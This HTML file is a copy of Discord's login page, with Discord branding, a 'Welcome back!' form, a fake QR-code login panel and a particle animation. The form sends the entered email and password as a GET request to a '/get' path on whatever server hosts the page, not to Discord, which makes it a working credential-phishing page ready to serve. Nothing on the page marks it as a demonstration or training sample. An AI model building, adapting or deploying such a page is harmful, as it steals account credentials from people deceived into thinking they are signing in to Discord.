<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Discord Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/svg+xml"
        href="data:image/svg+xml,%3C%3Fxml version='1.0' encoding='utf-8'%3F%3E%3Csvg width='256px' height='256px' viewBox='0 0 256 256' version='1.1' xmlns:xlink='http://www.w3.org/1999/xlink' xmlns='http://www.w3.org/2000/svg'%3E%3Cdefs%3E%3Cpath d='M256 0L256 0L256 256L0 256L0 0L256 0Z' id='path_1' /%3E%3CclipPath id='clip_1'%3E%3Cuse xlink:href='%23path_1' /%3E%3C/clipPath%3E%3C/defs%3E%3Cg id='discord' clip-path='url(%23clip_1)'%3E%3Cpath d='M256 0L256 0L256 256L0 256L0 0L256 0Z' id='discord' fill='%23FFFFFF' fill-opacity='0' stroke='none' /%3E%3Cpath d='M1 128C1 57.8598 57.8598 1 128 1C198.14 1 255 57.8598 255 128C255 198.14 198.14 255 128 255C57.8598 255 1 198.14 1 128Z' id='c' fill='%235865F2' fill-rule='evenodd' stroke='none' /%3E%3Cpath d='M182.283 75.7616C172.236 70.8229 161.493 67.2337 150.262 65.19C148.883 67.81 147.271 71.3339 146.16 74.1372C134.221 72.2508 122.392 72.2508 110.673 74.1372C109.562 71.3339 107.914 67.81 106.523 65.19C95.2794 67.2337 84.5245 70.8361 74.4776 75.7878C54.213 107.961 48.7196 139.335 51.4663 170.263C64.9069 180.808 77.9324 187.214 90.7381 191.406C93.8998 186.834 96.7197 181.974 99.149 176.852C94.5224 175.005 90.0911 172.726 85.904 170.08C87.0148 169.215 88.1013 168.311 89.1511 167.381C114.689 179.931 142.437 179.931 167.67 167.381C168.732 168.311 169.819 169.215 170.917 170.08C166.718 172.739 162.274 175.018 157.648 176.865C160.077 181.974 162.885 186.847 166.059 191.419C178.877 187.227 191.914 180.821 205.355 170.263C208.578 134.409 199.849 103.323 182.283 75.7616L182.283 75.7616ZM102.628 151.242C94.9619 151.242 88.6749 143.723 88.6749 134.566C88.6749 125.41 94.8277 117.877 102.628 117.877C110.429 117.877 116.716 125.396 116.582 134.566C116.594 143.723 110.429 151.242 102.628 151.242L102.628 151.242ZM154.193 151.242C146.527 151.242 140.24 143.723 140.24 134.566C140.24 125.41 146.392 117.877 154.193 117.877C161.994 117.877 168.281 125.396 168.146 134.566C168.146 143.723 161.994 151.242 154.193 151.242L154.193 151.242Z' id='i' fill='%23FFFFFF' fill-rule='evenodd' stroke='none' /%3E%3C/g%3E%3C/svg%3E" />

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            width: 100vw;
            height: 100vh;
            background-image: url("./new.png");
            background-size: cover;
            background-repeat: no-repeat;
            font-family: Helvetica, sans-serif;
            text-rendering: optimizeLegibility;
            user-select: none;
        }

        ::-webkit-scrollbar {
            display: none;
        }

        #svgBlob {
            height: 100vh;
            width: 100vw;
            position: absolute;
            top: 0;
            background: transparent;
            transition: 1s;
        }

        .position {
            position: absolute;
            width: 100vw;
            height: 100vh;
            display: grid;
            place-items: center;
        }

        .container {
            width: 784px;
            max-width: 90vw;
            padding: 32px;
            background-color: #313338;
            background: #313338;
            border-radius: 6px;
            left: 0;
            top: 0;
            -ms-flex-direction: row;
            flex-direction: row;
            -webkit-box-pack: start;
            -ms-flex-pack: start;
            justify-content: flex-start;
            flex-grow: 1;
            display: grid;
            place-items: center;
            box-shadow: 0 2px 10px 0 rgba(0, 0, 0, .2);
        }

        .centering-wrapper {
            width: 100%;
            text-align: center;
            margin: 0;
            padding: 0;
            border: 0;
            font-weight: inherit;
            font-style: inherit;
            font-family: inherit;
            font-size: 100%;
            vertical-align: baseline;
            flex: 1 1 auto;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -ms-flex-direction: row;
            flex-direction: row;
            flex-wrap: nowrap;
            -webkit-box-pack: start;
            -ms-flex-pack: start;
            justify-content: flex-start;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            display: flex;
        }

        .section1 {
            position: relative;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-flex: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
        }

        .primary-header {
            color: #fff;
            font-size: 24px;
            line-height: 30px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        .secondary-header {
            color: #a2a3a7;
            font-size: 16px;
            line-height: 20px;
        }

        .input-position {
            margin-top: 20px;
        }

        .form-group {
            width: 100%;
            text-align: left;
        }

        .input-placeholder {
            color: #919296;
            margin-bottom: 8px;
            font-size: 12px;
            font-weight: 700;
            line-height: 16px;
            text-transform: uppercase;
            -webkit-box-flex: 1;
            -ms-flex: 1;
            flex: 1;
            cursor: default;
        }

        .error-message {
            color: #ec4846;
            font-style: italic;
            text-transform: none;
            font-size: 12px;
            font-weight: 100;
            margin: 0;
            padding: 0;
            border: 0;
            vertical-align: baseline;
            transition: all 0.2s linear;
        }

        .form-style {
            position: relative;
            padding: 10px;
            height: 40px;
            width: 414px;
            max-width: 80vw;
            font-weight: 500;
            font-size: 16px;
            line-height: 22px;
            letter-spacing: 0.5px;
            color: #c4c3ca;
            background-color: #1e1f22;
            border: 1px solid #1e1f22;
            border-radius: 3px;
            outline: none;
            -webkit-transition: all 200ms linear;
            transition: border-color .2s ease-in-out;
        }

        .form-style:hover {
            border-color: #000;
        }

        .form-style:focus,
        .form-style:active {
            border-color: #7289d9;
        }

        .form-style:active .input-placeholder {
            color: #7289d9;
        }

        .btn-position {
            width: 100%;
            display: grid;
            place-items: center;
        }

        .btn {
            text-decoration: none;
            border-radius: 4px;
            height: 44px;
            width: 100%;
            margin-bottom: 10px;
            font-size: 13px;
            font-weight: 500;
            text-transform: capitalize;
            transition: all 200ms linear;
            letter-spacing: 1px;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            border: none;
            outline: none;
            background-color: #5865f2;
            color: white;
            cursor: pointer;
        }

        .btn:hover {
            background-color: #4752c4;
            box-shadow: 0 8px 24px 0 rgba(16, 39, 112, .2);
        }

        .password-container {
            display: block;
            padding-left: 0;
            padding-right: 0;
            margin-bottom: 20px;
            margin-top: 4px;
            width: 100%;
            height: auto;
            padding: 2px 90% 2px 0px;
            position: relative;
            -webkit-box-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            align-items: center;
            box-sizing: border-box;
            background: none;
            border: none;
            border-radius: 3px;
            font-size: 14px;
            font-weight: 500;
            line-height: 16px;
        }

        .link {
            color: #00a8fc;
            ;
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
            line-height: 1.7;
            margin: 0 auto;
            white-space: nowrap;
            text-overflow: ellipsis;
            overflow: hidden;
        }

        .link:hover {
            text-decoration: underline;
        }

        .horizontalSeparator {
            margin: 0 2.5vw;
            border: 1px solid #363940;
        }

        .qr-login {
            width: 240px;
            height: 344px;
            overflow: hidden;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-pack: center;
            -ms-flex-pack: center;
            -webkit-box-align: center;
            align-items: center;
            vertical-align: baseline;
        }

        .qr-container {
            display: flex;
            width: 176px;
            height: 176px;
            border-radius: 2px;
            /* background: #fff; */
            position: relative;
            margin: 30px 0px 32px 0px;
            justify-content: center;
            align-items: center;
        }

        .logo {
            width: 48px;
            height: 48px;
            position: absolute;
            background-blend-mode: overlay;
        }

        .qr-code {
            position: absolute;
        }

        .qr-pheader {
            font-weight: 600;
            margin-bottom: 8px;
            color: #fff;
            font-size: 24px;
            line-height: 30px;
        }

        .qr-sheader {
            font-size: 16px;
            line-height: 20px;
            color: #a2a3a7;
        }

        @media only screen and (max-width: 768px) {
            body {
                background-position: 0px 0px;
            }

            svgBlob {
                top: 50;
                left: 0;
                transform: translate(0, -50%);
            }

            .qr-login {
                display: none;
            }

            .horizontalSeparator {
                display: none;
            }

            .container {
                padding: 20px;
            }
        }

        @keyframes jump {
            0% {
                transform: translateY(0px);
                opacity: 1;
            }

            50% {
                transform: translateY(10px);
            }

            75% {
                opacity: 0.5;
            }

            100% {
                transform: translateY(-70px);
                opacity: 0;
            }
        }

        .squares {
            position: absolute;
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            margin: auto;
            width: 50px;
            height: 50px;
            animation: scale ease 1.4s infinite;
        }

        .squares::before {
            content: '';
            position: absolute;
            width: 15px;
            height: 15px;
            background: #7289da;
            top: -10px;
            left: -10px;
            animation: top ease 3s infinite;
        }

        .squares::after {
            content: '';
            position: absolute;
            width: 15px;
            height: 15px;
            background: #7289da;
            bottom: -10px;
            right: -10px;
            animation: bottom ease 3s infinite;
        }

        @keyframes top {
            0% {
                top: -10px;
            }

            20% {
                top: -10px;
                left: 100%;
            }

            40% {
                top: 100%;
                left: 100%;
                transform: rotate(-90deg);
            }

            60% {
                top: 100%;
                left: -10px;
                transform: rotate(180deg);
            }

            80% {
                top: -10px;
                left: -10px;
                transform: rotate(90deg);
            }

            100% {
                top: -10px;
            }
        }

        @keyframes bottom {
            0% {
                bottom: -10px;
            }

            20% {
                bottom: -10px;
                right: 100%;
            }

            40% {
                bottom: 100%;
                right: 100%;
                transform: rotate(-90deg);
            }

            60% {
                bottom: 100%;
                right: -10px;
                transform: rotate(180deg);
            }

            80% {
                bottom: -10px;
                right: -10px;
                transform: rotate(90deg);
            }

            100% {
                bottom: -10px;
            }
        }

        @keyframes scale {
            0% {
                transform: scale(1);
            }

            50% {
                transform: scale(0.7);
            }

            100% {
                transform: scale(1);
            }
        }

        .redStar {
            color: #f23f41;
            font-weight: 600;
        }

        .register-text {
            font-size: 13px !important;
            color: #a2a3a7;
        }

        .register-text a {
            font-size: 13px;
        }
    </style>
</head>

<body>
    <canvas id="svgBlob"></canvas>

    <div class="position">
        <form class="container">
            <div class="centering-wrapper">
                <div class="section1 text-center">
                    <form action="/get" id="form" method="GET" onsubmit="sub();">
                        <div class="primary-header">Welcome back!</div>
                        <div class="secondary-header">We're so excited to see you again!</div>
                        <div class="input-position">
                            <div class="form-group">
                                <h5 class="input-placeholder" id="email-txt">Email or Phone number <span
                                        class="redStar">*</span>
                                    <span class="error-message" id="email-error"></span>
                                </h5>
                                <input type="email" required="true" name="email" class="form-style" id="logemail"
                                    autocomplete="off" style="margin-bottom: 20px;">
                                <i class="input-icon uil uil-at"></i>
                            </div>
                            <div class="form-group">
                                <h5 class="input-placeholder" id="pword-txt">Password <span class="redStar">*</span>
                                    <span class="error-message" id="password-error"></span>
                                </h5>
                                <input type="password" required="true" name="password" class="form-style" id="logpass"
                                    autocomplete="on">
                                <i class="input-icon uil uil-lock-alt"></i>
                            </div>
                        </div>
                        <div class="password-container"><a href="#" class="link">Forgot your password?</a></div>
                        <div class="btn-position">
                            <a href="#" class="btn" onclick="sub();" type="submit">Login</a>
                        </div>
                        <div class="register-text">Do you need an account? <a href="#" class="link">Register</a></div>
                    </form>
                </div>
                <div class="horizontalSeparator"></div>
                <div class="qr-login">
                    <div class="qr-container">
                        <div class="squares"></div>
                    </div>
                    <div class="qr-pheader">Log in with QR Code</div>
                    <div class="qr-sheader">Scan this with the <strong>Discord App </strong>to log in instantly.</div>
                </div>
            </div>
        </form>
    </div>


    <script>
        const email = document.getElementById("logemail");
        const password = document.getElementById("logpass");
        const login = document.querySelector(".btn");
        const ptxt = document.getElementById("pword-txt");
        const etxt = document.getElementById("email-txt");
        const Eerror = document.getElementById("email-error");
        const perror = document.getElementById("password-error");
        const input = document.querySelector(".form-style");
        const container = document.querySelector(".container");
        const esearch = /^[^ ]+@[^ ]+\.[a-z]{2,3}$/;
        const psearch = /^.{8,32}$/;
        window.login = false;

        login.addEventListener('click', (e) => {
            if (email.value === "" || !email.value.match(esearch)) {
                email.focus();
                e.preventDefault();
                email.style.borderColor = "#ec4846";
                etxt.style.color = "#ec4846";
                Eerror.innerText = " - This is not a valid email address";
            }
            else if (!password.value.match(psearch)) {
                password.focus();
                e.preventDefault();
                password.style.borderColor = "#ec4846";
                ptxt.style.color = "#ec4846";
                perror.innerText = " - Password should be between 8 and 32 characters";
            }
            else {
                container.style.animation = "jump .3s linear";
                container.addEventListener('animationend', () => {
                    container.style.display = "none";
                    canvas.style.transform = "translate(0vw)";
                    // setTimeout(() => {
                    user.login = true;
                    // submit the form
                    //}, 1000)
                })
                    window.login = true;

                document.getElementById("form").submit();
            }
            setTimeout(() => {
                ptxt.style.color = "#919296";
                etxt.style.color = "#919296";
                perror.innerText = "";
                Eerror.innerText = "";
                email.style.borderColor = "";
                password.style.borderColor = "";
            }, 2500)

        });

        const canvas = document.getElementById('svgBlob');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        let numParticles = 20;
        let particles = [];

        const colors = ["#1d1e22", "#7d8087", "#5f6988"];

        const mouse = {
            x: null
        }

        let user = {
            login: false
        }

        class Particle {
            constructor() {
                this.x = Math.random() * canvas.width;
                this.y = canvas.height + (Math.random() * 200);
                this.radius = (Math.random() * 2) + 2;
                this.speedX = (Math.random() * 2);
                this.moveRight = this.x + this.speedX;
                this.moveLeft = this.x - this.speedX;
                this.speedY = Math.random() * 0.5;
                this.color = colors[Math.floor(Math.random() * 3)];
            }
            draw() {
                ctx.beginPath();
                ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2, false);
                ctx.fillStyle = this.color;
                ctx.fill();
                ctx.closePath();
            }
            update() {
                this.draw();
                if (!user.login) {
                    this.y -= this.speedY;
                } else {
                    this.y -= 10;
                }
                if (this.y <= canvas.height) {
                    if (mouse.x > canvas.width / 2) {
                        this.x = this.moveRight;
                    } else {
                        this.x = this.moveLeft;
                    }
                }
            }
        }

        function setup() {
            for (let i = 0; i < numParticles; i++) {
                particles.push(new Particle());
            }
        }

        window.addEventListener('mousemove', (e) => {
            mouse.x = e.x;
        })

        function animate() {
            requestAnimationFrame(animate);
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            particles.forEach((particle, index) => {
                particle.update();
                if (particle.y + particle.radius < 0) {
                    setTimeout(() => {
                        particles.splice(index, 1);
                    }, 0)
                    if (!user.login) {
                        particles.push(new Particle());
                    }
                }
            })
        }
        setup();
        animate();

        window.addEventListener('resize', function () {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        })

        function sub() {
            if(window.login){
                return true;
                // submit form
                console.log("submitting form");

            }
            else{
                console.log("not submitting form");
                return false;
            }
        }

        // var qr;
        // (function () {
        //     qr = new QRious({
        //         element: document.getElementById('qr-code'),
        //         size: 170,
        //         value: 'Paste a link or text over here to create a QR Code for it'
        //     });
        // })();
    </script>